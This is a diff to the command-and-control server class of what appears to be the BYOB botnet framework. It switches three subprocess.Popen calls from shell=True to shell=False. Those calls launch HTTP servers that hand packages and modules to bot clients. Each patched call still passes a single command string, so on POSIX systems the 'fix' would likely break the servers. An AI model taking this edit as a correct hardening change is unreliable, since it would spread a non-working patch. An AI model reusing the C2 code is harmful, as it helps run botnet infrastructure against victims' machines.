@@ -105,11 +105,11 @@ class C2(threading.Thread):
         # don't run multiple instances
         try:
             # serve packages
-            globals()['package_handler'] = subprocess.Popen('{0} -m {1} {2}'.format(sys.executable, http_serv_mod, self.port + 2), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=globals()['packages'], shell=True)
+            globals()['package_handler'] = subprocess.Popen('{0} -m {1} {2}'.format(sys.executable, http_serv_mod, self.port + 2), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=globals()['packages'], shell=False)
             util.log("Serving Python packages from {0} on port {1}...".format(globals()['packages'], self.port + 2))
 
             # serve modules
-            globals()['module_handler'] = subprocess.Popen('{0} -m {1} {2}'.format(sys.executable, http_serv_mod, self.port + 1), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=modules, shell=True)
+            globals()['module_handler'] = subprocess.Popen('{0} -m {1} {2}'.format(sys.executable, http_serv_mod, self.port + 1), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=modules, shell=False)
             util.log("Serving BYOB modules from {0} on port {1}...".format(modules, self.port + 1))
 
             globals()['c2'] = self
@@ -269,7 +269,7 @@ class C2(threading.Thread):
         while True:
             time.sleep(3)
             globals()['package_handler'].terminate()
-            globals()['package_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=globals()['packages'], shell=True)
+            globals()['package_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=globals()['packages'], shell=False)
 
     def run(self):
         """
